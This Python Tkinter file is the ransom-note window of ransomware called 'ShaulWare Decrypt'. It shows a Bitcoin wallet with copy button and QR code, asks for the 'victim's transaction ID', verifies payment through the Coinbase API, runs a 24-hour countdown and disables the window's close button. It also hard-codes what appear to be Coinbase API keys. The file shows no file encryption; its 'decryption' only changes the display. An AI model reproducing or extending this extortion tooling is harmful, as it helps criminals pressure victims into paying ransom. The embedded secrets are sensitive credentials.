import tkinter as tk
from timer import Timer
from tkinter import filedialog, Text
from coinbase.wallet.client import Client
import os

root = tk.Tk()
root.title('ShaulWare Decrypt')
root.resizable(False, False)
canvas = tk.Canvas(root, height=800, width=1250, bg="#841212")
canvas.pack()


canDecrypt = False
text_list = []


def disable_event():
    pass


def decryption_start():
    global canDecrypt
    global canvas
    if canDecrypt:
        canvas['background'] = '#558c0d'
        canvas.delete('all')
        canvas.create_image(125, 140, image=green_lock)
        for textbox in text_list:
            textbox.destroy()
    else:
        pass

# "b605656f-5bad-51ec-b200-c368aeac3fbe"


def check_payment():
    global canDecrypt
    transaction_id = client_transaction_id.get("1.0", tk.END+"-1c")
    api_key = 'ixhbHrVaDtbmlQQJ'
    api_secret = 'bwlPbxI86g8BSnp7TKb6eFMW47n40B92'
    account_id = "ce4c1a1f-65a4-5098-b6ac-b2f0f16f603f"
    my_address = "37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv"
    # ["to"]["address"]
    client = Client(api_key, api_secret)
    transaction = client.get_transaction(account_id, transaction_id)
    canDecrypt = transaction["amount"]["amount"] == "-0.00041194" # and transaction["to"]["address"] == my_address
    decryption_start()
    # Changes should me made to canDecrypt.
    print(transaction["amount"]["amount"])
    print(transaction, canDecrypt)
    # GUI CHANGES HERE...


def copy_address():
    r = tk.Tk()
    r.withdraw()
    r.clipboard_clear()
    r.clipboard_append("37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv")
    r.destroy()

# --------- TEXT ------------
# WHERE TO PUT THE VICTIM'S TRANSACTION ID:


transaction_id_writing = tk.Label(root, text="Transaction id here:", height=2)
transaction_id_writing.place(x=430, y=760)
text_list.append(transaction_id_writing)

# BITCOIN WALLET
my_wallet_id = tk.Label(root, text="BITCOIN WALLET: 37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv", height=2)
my_wallet_id.place(x=835, y=570)
text_list.append(my_wallet_id)

# VICTIM'S TRANSACTION ID
client_transaction_id = Text(root, height=2, width=40)
client_transaction_id.place(x=550, y=760)
text_list.append(client_transaction_id)


# --------- BUTTONS ------------
# A BUTTON TO CHECK PAYMENT
CheckPayment = tk.Button(root, text="Check Payment", fg="black", bg="white", padx=130, pady=5, command=check_payment)
CheckPayment.place(x=900, y=760)
text_list.append(CheckPayment)

# A BUTTON TO COPY THE ADDRESS TO CLIPBOARD
CopyAddress = tk.Button(root, text="Copy", fg="black", bg="white", padx=25, pady=5, command=copy_address)
CopyAddress.place(x=1160, y=570)
text_list.append(CopyAddress)


# --------- IMAGES ------------
# BITCOIN ACCEPTED HERE SIGN
bitcoin_accepted_here = tk.PhotoImage(file="bitcoin.png")
canvas.create_image(1040, 680, image=bitcoin_accepted_here)

# QR CODE
qr_code = tk.PhotoImage(file="QR.PNG")
canvas.create_image(740, 670, image=qr_code)

# RED LOCK

red_lock = tk.PhotoImage(file="red.png")
canvas.create_image(125, 140, image=red_lock)

# GREEN LOCK
green_lock = tk.PhotoImage(file="green.png")


# --------- LABELS ------------
timer = Timer(root=root, hours=23, minutes=59, seconds=59)
timer.run()

root.protocol("WM_DELETE_WINDOW", disable_event)
root.mainloop()
